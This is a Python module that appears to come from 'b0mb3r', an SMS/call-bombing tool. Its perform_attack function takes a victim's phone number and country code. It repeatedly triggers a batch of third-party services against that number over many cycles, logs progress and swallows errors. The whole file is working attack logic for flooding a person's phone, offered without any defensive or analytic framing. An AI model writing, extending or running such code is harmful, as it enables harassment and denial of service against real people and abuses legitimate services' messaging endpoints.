import asyncio
from datetime import datetime
from typing import Awaitable, Callable

from loguru import logger

from b0mb3r.app.status import status
from b0mb3r.service import services


async def await_with_callback(coroutine: Awaitable, callback: Callable, *args, **kwargs):
    try:
        await coroutine
    except Exception:
        pass
    finally:
        callback(*args, **kwargs)


def update_count(attack_id: str):
    if status[attack_id]["currently_at"] is None:
        status[attack_id]["currently_at"] = 0
    status[attack_id]["currently_at"] += 1


@logger.catch
async def perform_attack(attack_id: str, number_of_cycles: int, country_code: int, phone: str):
    if country_code in services:
        usable_services = services[country_code]
    else:
        usable_services = services["other"]

    status[attack_id]["started_at"] = datetime.now().isoformat()
    status[attack_id]["end_at"] = len(usable_services) * number_of_cycles

    logger.info(f"Starting attack {attack_id} on +{phone}...")

    for cycle in range(number_of_cycles):
        logger.info(f"Started cycle {cycle + 1} of attack {attack_id}")
        for service in usable_services:
            logger.debug(f"Running {service} in attack {attack_id}")
            asyncio.create_task(
                await_with_callback(
                    service(phone, country_code).run(), update_count, attack_id=attack_id,
                )
            )
        await asyncio.sleep(2)

    logger.success(f"Attack {attack_id} on +{phone} ended")
